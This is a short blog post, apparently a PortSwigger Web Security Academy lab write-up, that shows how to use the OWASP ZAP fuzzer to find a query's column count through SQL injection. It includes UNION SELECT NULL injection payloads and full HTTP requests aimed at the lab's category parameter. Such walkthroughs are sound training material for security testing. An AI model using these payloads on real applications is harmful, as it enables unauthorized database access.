+++
author = "Anthony Cozamanis"
title = "Determining the Number of Columns Returned by a Query Using SQLi"
date = "2023-05-13"
description = "In this brief piece, you'll learn about using OWASP ZAP to determining the number of columns returned by a query using SQLi."
tags = [
    "owsap",
    "zap",
    "pentesting",
]
series = ["OWASP ZAP"]
+++

Note: This was part of an overall effort to complete PortSwigger's Web Security Academy without Burp Suite.

If we take the URL `https://ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net/filter?category=Accessories` it can be seen that the category parameter is being used. Nothing new there. Let's see if when we give it something unexpected, it throws an error/s. Something like `'+UNION+SELECT+NULL--` at the end, like so:

`https://ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net/filter?category=Accessories'+UNION+SELECT+NULL--`

Ok, something bad is happening, I got the following when I send a GET request to that URL:

```
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

It might be nothing, but it might not be. Let's keep adding null values until the error disappears (if at all) and see if the response includes additional content containing the null values.

ZAP fuzzer will do this easily. Here'e the base request:

```
GET https://ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net/filter?category=Accessories HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Cookie: session=FTZuxjD1runfaB9lKsJJiQbHzdbgQUwQ
Upgrade-Insecure-Requests: 1
Host: ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net
```

The setup in ZAP's Fuzzer with the fuzz location highlighted:

![f5da81b4f48e81fd2b776ddf654c4d26.png](/img/f5da81b4f48e81fd2b776ddf654c4d26.png)

The payload strings:

![57a03f00772b20b8dd4e4b27895f835a.png](/img/57a03f00772b20b8dd4e4b27895f835a.png)

The result, looking good!

![0183df5146de20552126830324cd86c7.png](/img/0183df5146de20552126830324cd86c7.png)

Here's the payload used that got the result:

```
GET https://ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net/filter?category=Accessories%20'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Cookie: session=FTZuxjD1runfaB9lKsJJiQbHzdbgQUwQ
Upgrade-Insecure-Requests: 1
Host: ac741fd61fc83ed980cb8ea0000c000a.web-security-academy.net
```

3 NULLs was the winner. Let's see what the web browser shows us with this request:

![7ec32123d821db933f9b5d7710bc59d1.png](/img/7ec32123d821db933f9b5d7710bc59d1.png)

